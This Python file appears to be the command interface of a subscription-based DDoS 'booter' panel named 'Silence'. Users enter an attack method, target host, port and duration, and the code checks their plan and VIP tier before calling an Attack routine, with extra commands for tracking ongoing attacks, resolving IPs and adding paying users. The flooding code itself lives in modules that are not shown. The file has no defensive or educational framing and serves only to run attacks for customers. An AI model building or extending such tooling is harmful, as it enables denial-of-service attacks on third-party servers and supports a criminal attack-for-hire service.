from colorama import Fore as F
from time import sleep
# Importation des modules
from utils.plugin.variables import *
from utils.plugin.commun import *
from utils.attack.attack import *
from utils.admin.subscriber import *
from utils.plugin._check import *
from utils.admin.uptime import *
from utils.client.settings import *
from utils.client.authenticator import *
from utils.client.resolver import *
from utils.client.ongoing import *
import re
# configuration

theme = ConfigurationsTheme()


def commandes():
    try:
        print(f"{F.LIGHTBLACK_EX}┌⎯⎯⎯ [{F.LIGHTWHITE_EX} Silence ∙ {get_user()} {F.LIGHTBLACK_EX}]")
        commandes = input("└───➤  ").lower()
        match commandes:
            case "help":
                print("help")
            case "cls":
                cls()
                theme.home()
            case "uptime":
                cls()
                UPTIME().main()
            case "methods":
                cls()
                theme.methods()
            case "settings":
                cls()
                Settings().settings()
            case "resolver":
                cls()
                print(get_ip_tracker_all())

            case "ongoing":
                cls()
                ongoing()  
            case _:
                if commandes.startswith(tuple(METHOD)) or commandes.startswith(tuple(METHOD_VIP)):
                    method = commandes.split(" ")
                    
                    PLAN = User(username=get_user()).get_plan_by_username()[0]
                    if User(username=get_user()).get_plan_by_username()[0] == "free" and User(username=get_user(), plan=PLAN).plan_exists() == False:
                        raise ValueError("You are not allowed to use this method")
                    
                    HOST = method[1]
                    if is_valid_host(HOST) == False:
                       raise ValueError("Invalid host")
                    PORT = method[2]
                    if is_valid_port(PORT) == False:
                       raise ValueError("Invalid port")
                    TIME = method[3]
                    if is_valid_time(TIME) == False:
                       raise ValueError("Invalid time")
                    try:
                        Attack(host=HOST, port=PORT, time=TIME, method=method[0], vip=User(username=get_user()).get_vip_by_username()[0][0], plan=PLAN, username=get_user()).attack()
                    except ValueError as e:
                        print(str(e))
                    except Exception as e:
                       print("An error occurred:", str(e))

                elif commandes.startswith("2fa"):
                    commandes = commandes.split(" ")
                    if commandes[1] == "on" or "1":
                        Authenticator("1").active()
                    elif commandes[1] == "off" or "0":
                        Authenticator("0").active()
                    else:
                        print("ERROR")

                elif commandes.startswith("adduser"):
                    commandes = commandes.split(" ")
                    if User(username=get_user()).get_rank_by_username()[0] == "admin":
                            add_user(username=commandes[1], password=commandes[2], plan=commandes[4], vip=commandes[5], api=commandes[6])
                    else:
                        raise ValueError("You are not allowed to use this command")

                    

    except Exception as e:
        print(e)

    pass







if __name__ == "__main__":
    try:
        setup()
        delete_expired_subscriptions()
        plan = User(username=get_user()).get_plan_by_username()[0]
        if User(username=get_user()).get_plan_by_username()[0] == "free" and User(username=get_user, plan=plan).plan_exists() == False:
            while True:
                theme.blocked()
                sleep(1)
                cls()
        else:
            cls()
            if User(username=get_user()).get_2fa_by_username()[0] == "1" and Authenticator().verify() == False:
                raise ValueError("Invalid 2FA code")
                
            else:
                
                    cls()
                    theme.home()
                    while True:
                        commandes()

    except ValueError as e:
        print(str(e))

            

        